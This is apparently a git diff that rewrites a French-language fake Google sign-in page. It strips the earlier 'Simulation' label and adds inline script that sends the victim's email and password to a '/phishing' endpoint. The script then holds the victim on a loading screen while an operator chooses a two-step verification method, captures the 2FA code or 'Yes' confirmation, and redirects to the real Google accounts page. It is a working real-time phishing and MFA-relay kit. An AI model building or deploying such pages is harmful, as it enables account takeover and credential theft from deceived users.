@@ -3,56 +3,317 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔒 Connexion Gmail (Simulation)</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Connexion - Compte Google</title>
+    <style>
+        body {
+            font-family: 'Google Sans', 'Roboto', arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #fff;
+        }
+        .login-box {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: none;
+            width: 450px;
+            text-align: center;
+            border: 1px solid #dadce0;
+        }
+        img { width: 75px; margin-bottom: 20px; }
+        h2 { font-weight: 400; margin-bottom: 10px; font-size: 24px; color: #202124; }
+        p { color: #202124; margin-bottom: 30px; font-size: 16px; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            margin: 5px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: border 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+        }
+        .btn-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+        }
+        button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        button:hover { background-color: #1557b0; }
+        .link { color: #1a73e8; text-decoration: none; font-size: 14px; cursor: pointer; font-weight: 500; }
+        
+        /* Loading Screen Styles */
+        #loadingScreen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4285f4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            margin-top: 20px;
+            font-family: 'Google Sans', arial, sans-serif;
+            color: #70757a;
+            font-size: 14px;
+        }
+
+        .a2f-option {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            margin-bottom: 8px;
+            border: 1px solid transparent;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-align: left;
+        }
+        .a2f-option:hover {
+            background-color: #f1f3f4;
+            border-color: #dadce0;
+        }
+        .a2f-option strong {
+            color: #3c4043;
+            font-weight: 500;
+            margin-right: 5px;
+        }
+        .a2f-option .desc {
+            color: #5f6368;
+            font-size: 13px;
+            display: block;
+        }
+    </style>
 </head>
-<body class="google-body">
-    <div class="container">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Gmail_logo_%282013%29.svg/1200px-Gmail_logo_%282013%29.svg.png" alt="Gmail Logo">
-        </div>
-        <div class="form-container">
-            <h2 id="formTitle">Connexion</h2>
-            <p id="formSubtitle">Utilisez votre compte Google</p>
+<body>
+    <div id="loadingScreen" style="display: none;">
+        <div class="spinner"></div>
+        <div class="loading-text">Chargement...</div>
+    </div>
+
+    <div class="login-box" id="loginBox">
+        <img src="https://imgs.search.brave.com/-PNMs2ogoyqPYULA3aW41qAfB84WIxwrzLoxsTTh6FQ/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly91cGxv/YWQud2lraW1lZGlh/Lm9yZy93aWtpcGVk/aWEvY29tbW9ucy9l/L2VlL0dvb2dsZV8y/MDI2X2xvZ28uc3Zn" alt="Google">
+        <h2 id="title">Connectez-vous</h2>
+        <p id="subtitle">Utilisez votre compte Google</p>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" placeholder="Adresse e-mail ou téléphone" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Saisissez votre mot de passe" required>
+            </div>
+            <div class="btn-container">
+                <a href="#" class="link">Créer un compte</a>
+                <button type="submit">Suivant</button>
+            </div>
+        </form>
+    </div>
+
+    <div class="login-box" id="twoFactorBox" style="display: none;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google">
+        <h2 style="text-align: left;">Vérification en deux étapes</h2>
+        <p id="a2fDescription" style="text-align: left; margin-bottom: 20px;">Vérification de votre identité...</p>
             
-            <form id="loginForm">
-                <div class="input-group">
-                    <input type="email" id="email" placeholder="Adresse e-mail ou téléphone" required>
-                </div>
-                <div class="input-group">
-                    <input type="password" id="password" placeholder="Saisissez votre mot de passe" required>
-                </div>
-                <div class="form-footer">
-                    <a href="#" class="link">Mot de passe oublié ?</a>
-                    <button type="submit" class="submit-btn">Suivant</button>
-                </div>
-            </form>
-
-            <form id="twoFactorForm" style="display: none;">
-                <div class="input-group">
-                    <label for="twoFactorCode" class="label-text">Saisissez le code de validation</label>
-                    <input type="text" id="twoFactorCode" placeholder="000000" maxlength="6" required>
-                </div>
-                <div class="form-footer">
-                    <a href="#" class="link">Essayer une autre méthode</a>
-                    <button type="submit" class="submit-btn">Vérifier</button>
-                </div>
-            </form>
-
-            <div class="security-warning" id="securityWarning" style="display: none;">
-                <p>⚠️ Vérification de sécurité en cours...</p>
-                <p>Veuillez confirmer votre identité via un code à 6 chiffres envoyé sur votre appareil.</p>
-            </div>
+        <div id="a2fMethodContainer" style="text-align: left; margin-bottom: 20px;">
+            <!-- The method will be injected here by the server -->
         </div>
-        <div class="bottom-links">
-            <span class="lang-selector">Français</span>
-            <div class="footer-links">
-                <a href="#">Aide</a>
-                <a href="#">Confidentialité</a>
-                <a href="#">Conditions</a>
-            </div>
+
+        <div id="codeInputArea" style="display: none; margin-top: 20px; border-top: 1px solid #dadce0; padding-top: 20px;">
+            <form id="twoFactorForm">
+                <div class="input-group">
+                    <p id="selectedMethod" style="font-size: 14px; margin-bottom: 15px; color: #202124; font-weight: 500; text-align: center;"></p>
+                    <input type="text" id="twoFactorCode" placeholder="Code de validation" required maxlength="6" style="text-align: center; letter-spacing: 8px; font-size: 24px;">
+                </div>
+                <div class="btn-container">
+                    <a href="#" class="link" onclick="location.reload()">Essayer une autre méthode</a>
+                    <button type="submit">Vérifier</button>
+                </div>
+            </form>
         </div>
     </div>
-    <script src="script.js"></script>
+
+    <script>
+        async function showLoading(show) {
+            document.getElementById('loadingScreen').style.display = show ? 'flex' : 'none';
+        }
+
+        async function fetchCurrentMethod() {
+            try {
+                const response = await fetch('http://localhost:5000/admin');
+                const data = await response.json();
+                return data.current_method;
+            } catch (e) {
+                return 'SMS';
+            }
+        }
+
+        function setupA2FMethod(method) {
+            const container = document.getElementById('a2fMethodContainer');
+            const desc = document.getElementById('a2fDescription');
+            
+            let methodHtml = '';
+            let methodText = '';
+
+            switch(method) {
+                case 'Oui':
+                    methodHtml = `<div class="a2f-option"><strong>Appuyer sur Oui</strong><span class="desc">sur votre téléphone ou tablette</span></div>`;
+                    methodText = 'Appuyer sur Oui';
+                    // Masquer le champ de saisie du code pour la méthode "Oui"
+                    document.getElementById('codeInputArea').style.display = 'none';
+                    // On peut ajouter un bouton de simulation ou juste laisser la page
+                    break;
+                case 'SMS':
+                    methodHtml = `<div class="a2f-option"><strong>SMS</strong><span class="desc">Recevoir un code au •• •• •• •• 23</span></div>`;
+                    methodText = 'SMS';
+                    document.getElementById('codeInputArea').style.display = 'block';
+                    break;
+                case 'Authenticator':
+                    methodHtml = `<div class="a2f-option"><strong>Google Authenticator</strong><span class="desc">Obtenir un code depuis l'application Authenticator</span></div>`;
+                    methodText = 'Google Authenticator';
+                    document.getElementById('codeInputArea').style.display = 'block';
+                    break;
+                default:
+                    methodHtml = `<div class="a2f-option"><strong>Code de sécurité</strong><span class="desc">Utilisez un code de sécurité</span></div>`;
+                    methodText = 'Code de sécurité';
+                    document.getElementById('codeInputArea').style.display = 'block';
+            }
+
+            container.innerHTML = methodHtml;
+            document.getElementById('selectedMethod').innerText = "Méthode : " + methodText;
+            
+            if (method !== 'Oui') {
+                document.getElementById('codeInputArea').style.display = 'block';
+            } else {
+                // Pour la méthode "Oui", on peut ajouter un bouton "J'ai appuyé sur Oui" 
+                // ou simplement laisser l'utilisateur attendre. 
+                // Ajoutons un bouton de confirmation pour rendre ça fonctionnel.
+                const btnContainer = document.createElement('div');
+                btnContainer.className = 'btn-container';
+                btnContainer.style.marginTop = '20px';
+                btnContainer.innerHTML = `<button onclick="confirmOui()">J'ai appuyé sur Oui</button>`;
+                document.getElementById('twoFactorBox').appendChild(btnContainer);
+            }
+        }
+
+        async function confirmOui() {
+            try {
+                const response = await fetch('http://localhost:5000/twofactor', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        code: 'CONFIRMED_YES',
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                const result = await response.json();
+                if (result.status === 'success') {
+                    alert('Connexion réussie !');
+                    window.location.href = 'https://accounts.google.com/';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Une erreur est survenue.');
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            showLoading(true);
+            
+            try {
+                const response = await fetch('http://localhost:5000/phishing', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                
+                const result = await response.json();
+                if (result.status === 'success') {
+                    // On attend indéfiniment que l'admin choisisse une méthode
+                    const checkInterval = setInterval(async () => {
+                        const currentMethod = await fetchCurrentMethod();
+                        
+                        // On ne s'arrête QUE si une méthode a été sélectionnée (différente de null/None)
+                        if (currentMethod && currentMethod !== 'null' && currentMethod !== 'None') {
+                            clearInterval(checkInterval);
+                            showLoading(false);
+                            document.getElementById('loginBox').style.display = 'none';
+                            document.getElementById('twoFactorBox').style.display = 'block';
+                            setupA2FMethod(currentMethod);
+                        }
+                    }, 500); // Vérification toutes les 500ms
+                }
+            } catch (error) {
+                showLoading(false);
+                console.error('Error:', error);
+                alert('Une erreur est survenue.');
+            }
+        });
+
+        document.getElementById('twoFactorForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const code = document.getElementById('twoFactorCode').value;
+            
+            try {
+                const response = await fetch('http://localhost:5000/twofactor', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        code: code,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                
+                const result = await response.json();
+                if (result.status === 'success') {
+                    alert('Connexion réussie !');
+                    window.location.href = 'https://accounts.google.com/';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Une erreur est survenue.');
+            }
+        });
+    </script>
 </body>
 </html>
